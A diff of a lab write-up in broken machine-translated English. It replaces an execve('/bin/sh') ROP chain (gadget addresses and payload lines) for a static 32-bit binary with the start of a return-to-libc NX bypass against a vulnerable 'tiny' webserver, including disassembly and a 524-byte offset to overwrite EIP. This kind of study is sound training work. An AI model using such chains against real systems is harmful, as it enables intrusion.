@@ -1,131 +1,96 @@
-# # execve () ROP
+# Writeup - Return-to-libc - NX Bypass - lab2
 
-- compilation with `-static` flag;
-- stack-protectors disabled;
-- ASLR enabled.
-
-Starting from the previous labs, the following ROP Chain has been created which allows you to run the `execve (" / bin / sh ", 0, 0)` systemcall.
-
-The ROP Chain was built using only gadgets present in the binary in order to evade the ASLR (the program was compiled with the `-static` flag to increase the quantity of gadgets present, being of a smaller size).
-
-To identify the gadgets used it is possible to use `objdump` or` RopGadget` (https://github.com/JonathanSalwan/ROPgadget), also available in GDB peda.
-
-The `gadgets` file shows the complete list of the gadgets present.
-
-NOTE: by default, the pre-compiled `tiny-lab3-precomp` version of the webserver is included in order to keep the same addresses in the writeup as a reference. Alternatively, you can uncomment the `# RUN make` line to recompile the server.
-
-## ROP Chain development
-
-### Target
-
-Run syscall `execve (" / bin / sh ", 0, 0)` - whose number is `0xb` - to run shell.
-
-It is therefore necessary:
-- `eax = 0xb`:` eax` containing syscall number to be made once made
-  interrupt `int 0x80`;
-- `ebx`: will have to point to the start memory address of the string" / bin / sh ";
-- `ecx`: used to point to argument arrays; not used in this case, so its
-  value will be `0x0`;
-- `edx`: used to put to environment veritable arrays; not used in this case,
-  so it will be `0x0`.
-- find and use gadgets with `int 0x80` to make system call.
-
-### Description of gadgets used
-
-#### Writing "/ bin / sh" into memory
-
-First the string "/ bin / sh" was written in memory, in order to reuse it later (EBX will have to point to the beginning of the string).
-
-The gadgets and values ​​used in this regard:
-
+This technique is useful as NX Bypass as shown below
 `` `
-pop_edx = 0x0807662a # pop edx; ret
-pop_eax = 0x080bc865 # pop eax; ret
-mov_mem = 0x080562ab # mov dword ptr [edx], eax; ret
-
-
-write_1 = 0x080f1010 # .bss start address
-write_2 = 0x080f1014 # .bss start address + 4
+root @ 6c712780745b: / opt # execnoaslr gdb tiny-lab2
+GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
+...
+gdb-peda $ checksec
+CANARY: disabled
+FORTIFY: disabled
+NX: ENABLED
+PIE: disabled
+RELRO: Partial
 `` `
 
-`write_1` is the chosen memory address where to start writing" / bin / sh "; was chosen
-the beginning of the `.bss` section as writable and to avoid overwriting
-the `.text` section.
 
-In `write_1` the first 4 bytes" / bin "will be written, while in` write_2` the second part
-"// sh" ("// sh" was written to avoid null bytes; at bash level the first "/" will be ignored).
-
-Writing chain "/ bin / sh":
+## OFFSET identification
+Identifying the offset of the variable in the overflowing frame was by carrying out rooting by disassembling the function identified as vulnerable by AddressSanitizer, in addition by looking disassembled it was possible to identify which was the vulnerable buffer which as seen the overflow phase is in url_decode that works on pointers of variables instantiated in process therefore overflow will be relative to the execution frame of process:
 `` `
-payload + = p (pop_edx) # EDX will point to .bss start
-payload + = p (write_1)
-payload + = p (pop_eax) # writes "/ bin" in EAX
-payload + = "/ bin"
-payload + = p (mov_mem) # moves EAX = "/ bin" at address pointed by EDX (.bss start)
-payload + = p (pop_edx)
-payload + = p (write_2) # EDX will point at .bss start + 4
-payload + = p (pop_eax) # writes "// sh" in EAX
-payload + = "// sh"
-payload + = p (mov_mem) # moves EAX = "// sh" at address pointed by EDX (.bss start + 4)
+# root @ 06c96654b96d: / opt # execnoaslr radare2 tiny-lab2
+[0x08048aa0]> aaa
+[x] Analyze all flags starting with sym. and entry0 (aa)
+[x] Analyze function calls (aac)
+[x] Analyze len bytes of instructions for references (aar)
+[x] Type matching analysis for all functions (aaft)
+[x] Use -AA or aaaa to perform additional experimental analysis.
+[0x08048aa0]> pdf @ sym.process
+/ (fcn) sym.process 565
+| sym.process (int arg_8h, void * arg_ch);
+| ; var int var_28ch @ ebp-0x28c
+| ; var int var_288h @ ebp-0x288
+| ; var int var_284h @ ebp-0x284
+| ; var int var_280h @ ebp-0x280
+| ; var int var_27ch @ ebp-0x27c
+| ; var int var_278h @ ebp-0x278
+| ; var int var_274h @ ebp-0x274
+| ; var char * var_270h @ ebp-0x270
+| ; var char * var_26ch @ ebp-0x26c
+| ; var signed int fildes @ ebp-0x268
+| ; var int var_264h @ ebp-0x264
+| ; var int var_260h @ ebp-0x260
+| ; var int var_250h @ ebp-0x250
+| ; var signed int var_234h @ ebp-0x234
+| ; var char * path @ ebp-0x208 <- This is an overflow buffer identified because in the code it is used in the open ()
+and for this reason it is renamed symbolically to be rooted in path
+| ; var signed int var_8h_2 @ ebp-0x8
+| ; var uint32_t var_4h_2 @ ebp-0x4
+| ; arg int arg_8h @ ebp + 0x8
+| ; arg void * arg_ch @ ebp + 0xc
+| ; var void * oflag @ esp + 0x4
+| ; var char * var_8h @ esp + 0x8
+| ; var int var_ch @ esp + 0xc
+| ; CALL XREFS from main (0x804a1df, 0x804a287)
+| 0x08049d90 55 push ebp
+| 0x08049d91 89e5 mov ebp, esp
 `` `
-
-First, `pop_edx` was used to insert` write_1` in `edx` (` pop edx`).
-
-The chain continues by jumping to the `pop_eax` gadget (thanks to the` ret` which inserts the address of the next gadget
-on the PC) through which the string "/ bin" is written in the `eax` register.
-
-The third element of the chain is `mov_mem`, which allows you to write the content of` eax` in the address pointed to by `edx`, or` write_1`. In this way the first
-part of "/ bin / sh" will be written in the selected memory section.
-
-The chain continues in a similar way to write "// sh", using the same gadgets.
-
-At the end of the chain "/ bin / sh" will be written to the memory address `write_1`.
-
-#### EDX = 0 and EBX -> "/ bin // sh"
-
+From this disassembled and from the source code it has been identified that it is the `strut http_request` with the field` filename`
+which is passed to open by the following code:
+`File: tiny.c`
 `` `
-xor_eax = 0x0804a3c3 # xor eax, eax; ret
-xor_edx = 0x08098280 # xor edx, edx; div esi; pop ebx; pop esi; pop edi; pop ebp; ret
+void process (int fd, struct sockaddr_in * clientaddr) {
+    printf ("accept request, fd is% d, pid is% d \ n", fd, getpid ());
+    http_request req;
+    parse_request (fd, & req);
 
+    struct stat sbuf;
+    int status = 200, ffd = open (req.filename, O_RDONLY, 0);
+    if (ffd <= 0) {
+        status = 404;
+        char * msg = "File not found";
+
+[...]
 `` `
-
-Chain used:
+Of which the relative disassembled recognizable by the `call sym.imp.open; int open (const char * path, int oflag) `
 `` `
-payload + = p (xor_eax) # EAX = 0
-payload + = p (xor_edx) # EDX = 0; EBX = address of "/ bin // sh"
-payload + = p (write_1)
-payload + = "JUNK" * 3
+[0x08048aa0]> pdf @ sym.process
+[...]
+           0x08049df8 c7859cfdffff. mov dword [var_264h], 0xc8; 200
+| 0x08049e02 890c24 mov dword [esp], ecx; const char * path
+| 0x08049e05 c74424040000. mov dword [oflag], 0; int oflag
+| 0x08049e0d c74424080000. mov dword [var_8h], 0
+| 0x08049e15 89857cfdffff mov dword [var_284h], eax
+| 0x08049e1b e8f0eaffff call sym.imp.open; int open (const char * path, int oflag)
+| 0x08049e20 898598fdffff mov dword [fildes], eax
+| 0x08049e26 83bd98fdffff. cmp dword [fildes], 0
+
+[...]
 `` `
+And here in the first screen of `shave` we have that the buffer overflow is distant from the` Base Pointer: EBP` the following value: `; var char * path @ ebp-0x208` where `0x208 bytes` are based on 10` 520 bytes` and therefore on this value by adding `4 bytes` (as` 32bit`) relative to the exact value of the `EBP` as shown in the 'image:
+! [Stack image] (https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/100912_1629_ReturnOrien2.png)
 
-the `xor_edx` gadget was used to reset the` edx` registry. However, the presence
-of the `div esi` instruction makes it necessary to clear the` eax` register first as the instruction
-performs the division between `eax` and` esi`, putting the result in `eax` and the rest of the division
-in `edx`.
 
-So, by setting `eax = 0x0` first, the result of the division will be 0 with remainder 0 and
-and both the `eax` and` edx` registers will contain `0x0`.
+Consequently, the exploit injecting `" A "* 524` will include all the offset from the` Base Pointer EBP` including its `4 bytes of value` therefore, any byte written in more will overwrite the` Return Address EIP` and it will be precisely in those 4 bytes that the address calculated as a jump on function extracted from `LIBC` will be injected, in this case the` system () `function.
 
-Furthermore, in the `xor_edx` gadget there is the` pop ebx` instruction, which will be used to insert
-the `write_1` address (which contains" / bin // sh ") in the` ebx` register.
-
-#### ECX = 0
-
-`` `
-mov_ecx = 0x0805e319 # mov ecx, edx; rep stosb byte ptr es: [edi], al; mov eax, dword ptr [esp + 8]; pop edi; ret
-
-`` `
-
-Chain used:
-`` `
-payload + = p (mov_ecx) # ECX = 0
-payload + = "JUNK"
-`` `
-
-the `mov_ecx` gadget was used to copy the contents of` edx` to `ecx`, that is` 0x0`.
-
-#### EAX = 0xb
-
-`` `
-pop_edx = 0x0807662a # pop edx; ret
-pop_eax = 0x080bc865 # pop eax; ret
-sub_eax = 0x080562dc # sub eax, edx;
+## Construction Idea
+You can imagine the system execution as a new execution frame that contains the `RET address` as the first value to return to, which in our case will be the` 4 bytes` set to `" B "* 4` and then the parameters to be passed to
